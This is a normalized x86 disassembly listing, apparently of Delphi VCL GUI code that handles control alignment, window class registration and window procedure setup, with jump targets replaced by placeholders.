jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44278d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44291c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44294b ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4429d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4431c8
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_417414
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_417570
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_442594
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44318c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_4175ec
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_417570
mov edx eax
mov ecx ebx
mov eax edi
call sub_442508
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_442b44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_4431c8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44318c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44318c
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_442b98
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_442b44
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442c77
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4429d4
pop ecx
push ebp
mov al 0x2
call sub_4429d4
pop ecx
push ebp
mov al 0x3
call sub_4429d4
pop ecx
push ebp
mov al 0x4
call sub_4429d4
pop ecx
push ebp
mov al 0x5
call sub_4429d4
pop ecx
push ebp
mov al 0x6
call sub_4429d4
pop ecx
push ebp
xor eax eax
call sub_4429d4
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4034e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_442c9c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442d30
xor eax eax
push ebp
push sub_442d23
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_442d38
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_442d60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442e25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f6b4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e2c
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44318c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_417414
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43f420
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_417570
xor ecx ecx
mov edx 0xb03e
call sub_440e64
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44318c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_442e34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4431c8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_442d30
xor edx edx
push ebp
push sub_442f1b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44318c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_417414
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_417570
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
call sub_442d38
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44318c
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43f1c4
mov dl 0x4
call sub_43f1c4
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_417460
sub_442f88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_456c04
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45a928
sub_442fa8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43e5a4
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43e5a4
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43e5a4
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_442ff4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43e5cc
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43e5cc
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43e5cc
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44303c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4034e4
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_440e64
mov edx ebx
mov eax edi
call sub_442fa8
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_440e64
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_440e64
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax edi
call sub_4467d4
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_440e64
mov eax edi
call sub_443b8c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_442c9c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443110
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_440e64
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax esi
call sub_4467d4
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_442f88
mov eax ebp
call sub_4439f0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_442ff4
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_440e64
mov eax esi
call sub_442d58
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4400f8
sub_44318c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_417570
mov edx edi
mov eax ebp
call sub_417570
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4431e8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_4431c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44318c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_443228
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4431e8
add esp 0x10
retn
sub_443250
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_4432bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4402f4
test al al
je r-xdata
mov eax ebx
call sub_440324
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_4034e4
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4034e4
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4034e4
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_443324
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_443442
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402cfc
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4432bc
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4464d0
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403238
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4088e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443449
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_443450
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_443611
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx r-xdata
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cc30
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cc30
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408a88
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_4467e0
push 0x1
mov eax [ esi + 0x68 ]
call sub_420480
mov ecx eax
mov edx 0x30
mov eax esi
call sub_440e64
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4464d0
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443618
lea eax [ ebp - 0xc0 ]
call sub_404038
retn
mov eax esi
mov si 0xffee
call sub_4034e4
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_443620
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d30
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_443660
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b528
mov eax esi
call sub_41b478
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41b478
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41b530
pop esi
pop ebx
retn
sub_443698
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41cd74
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41cd00
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41cd00
mov eax esi
call sub_41cd7c
add esp 0x10
pop esi
pop ebx
retn
sub_443700
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_4436ec
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_417570
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_417570
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4437d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
